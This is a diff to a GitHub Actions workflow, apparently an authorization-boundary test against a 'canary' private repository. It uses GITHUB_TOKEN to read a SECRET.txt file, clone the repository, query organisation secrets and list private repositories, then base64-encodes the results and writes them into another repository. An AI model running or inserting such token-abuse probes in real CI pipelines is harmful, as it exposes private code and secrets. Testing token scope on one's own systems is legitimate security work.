@@ -5,12 +5,22 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: probe sibling private repo with GITHUB_TOKEN
+      - name: probe with GITHUB_TOKEN
         env:
           GT: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "REPO_API:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" https://api.github.com/repos/s3rdz0-org/bola-canary-23514)"
-          echo "CONTENTS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" https://api.github.com/repos/s3rdz0-org/bola-canary-23514/contents/SECRET.txt)"
-          echo "ISSUE:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" https://api.github.com/repos/s3rdz0-org/bola-canary-23514/issues/1)"
-          echo "CLONE:$(git clone https://x-access-token:$GT@github.com/s3rdz0-org/bola-canary-23514 /tmp/c 2>&1 | tail -1)"
-          echo "INSTALL_REPOS:$(curl -s -H "Authorization: token $GT" https://api.github.com/installation/repositories | head -c 200)"
+          A=https://api.github.com
+          C=s3rdz0-org/bola-canary-23514
+          RES="$(
+            echo "REPO_API:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C)"
+            echo "CONTENTS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/contents/SECRET.txt)"
+            echo "ISSUE:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/issues/1)"
+            echo "CLONE:$(git clone https://x-access-token:$GT@github.com/$C /tmp/c 2>&1 | tail -1)"
+            echo "ORG_SECRETS:$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/orgs/s3rdz0-org/actions/secrets)"
+            echo "ORG_REPOS_PRIV:$(curl -s -H "Authorization: token $GT" "$A/orgs/s3rdz0-org/repos?type=private" | head -c 120)"
+            echo "INSTALL_REPOS:$(curl -s -H "Authorization: token $GT" $A/installation/repositories | head -c 400)"
+          )"
+          echo "$RES"
+          echo "$RES" >> "$GITHUB_STEP_SUMMARY"
+          B64=$(printf '%s' "$RES" | base64 -w0)
+          curl -s -X PUT -H "Authorization: token $GT" $A/repos/s3rdz0-org/bola-actions/contents/RESULTS.txt -d "{\"message\":\"res\",\"content\":\"$B64\"}" -o /dev/null -w "PUT_RESULT:%{http_code}\n"
